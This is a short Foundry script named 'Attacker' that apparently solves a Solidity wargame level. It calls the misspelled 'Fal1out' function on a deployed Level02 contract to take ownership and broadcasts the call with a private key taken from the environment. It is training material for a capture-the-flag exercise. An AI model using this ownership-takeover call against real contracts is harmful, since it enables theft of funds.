// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Level02.sol";

contract Attacker is Script {
    Level02 level02 = Level02(0x77E0f5938A66E62B830039FC4ef6f6c925133aaE);

    function run() public {
      vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
      level02.Fal1out();
      vm.stopBroadcast();
    }
}
